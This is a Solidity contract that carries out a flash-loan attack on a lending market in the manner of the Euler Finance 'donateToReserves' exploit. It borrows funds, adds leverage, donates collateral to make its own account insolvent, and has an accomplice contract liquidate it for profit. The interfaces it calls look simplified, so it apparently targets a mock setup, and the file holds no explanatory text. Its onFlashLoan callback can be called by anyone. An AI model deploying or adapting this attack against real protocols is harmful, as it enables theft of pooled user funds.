// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract donate
{
    address public owner;
    address public euler;
    address public lender;
    address public eDAI;
    address public sDAI;
    address public liquidator;
    uint256 public liquidSplit; //need setter, default to 27000000
    uint256 public amount;
    uint256 public multiplyer;
    uint256 public donationAmount;

    //(bool something, ) = address.call(abi.encodeWithSignature("function", args));
    // require(something, "Flash loan was not successfully created");
    constructor(address _owner, address _euler, address _lender, address _eDAI, address _sDAI, address _liquidator, uint256 _liquidSplit, uint256 _amount, uint256 _multiplyer,uint256 _donationAmount)
    {
        owner = _owner;
        euler = _euler;
        lender = _lender;
        eDAI = _eDAI;
        sDAI = _sDAI;
        liquidator = _liquidator;
        liquidSplit = _liquidSplit;
        amount = _amount;
        multiplyer = _multiplyer;
        donationAmount = _donationAmount;
    }

    function begin() public
    {
        require(msg.sender == owner);
        (bool success1, ) = lender.call(abi.encodeWithSignature("flashLoan(uint256)", amount));
        require(success1, "Flash loan was not successfully created");
    }

    function onFlashLoan() public
    {
        (bool send, ) = sDAI.call(abi.encodeWithSignature("transfer(address,uint256)", liquidator, liquidSplit));
        require(send, "Failed to send sDAI to liquidator");

        (bool getE, ) = eDAI.call(abi.encodeWithSignature("purchase(uint256)", amount-liquidSplit));
        require(getE, "Failed to exchange sDAI => eDAI");

        (bool leverage, ) = euler.call(abi.encodeWithSignature("leverage(uint256)", multiplyer));
        require(leverage, "Failed to increase leverage");

        (bool donateDAI, ) = eDAI.call(abi.encodeWithSignature("donateToReserves(uint256)", donationAmount));
        require(donateDAI, "Failed to donate eDAI");

        (bool health, ) = euler.call(abi.encodeWithSignature("healthCheck(address)", address(this)));
        require(health, "Failed to get health of account");

        (bool liquidateMe, ) = liquidator.call(abi.encodeWithSignature("beginLiquidation(address)", address(this)));
        require(liquidateMe, "Failed to liquidate the donate contract");
    }
    
    function setLiquidSplit(uint256 x) public
    {
        require(msg.sender == owner);
        liquidSplit = x;
    }
    function setAmount(uint256 x) public
    {
        require(msg.sender == owner);
        amount = x;
    }
    function setMultiplyer(uint256 x) public
    {
        require(msg.sender == owner);
        multiplyer = x;
    }
}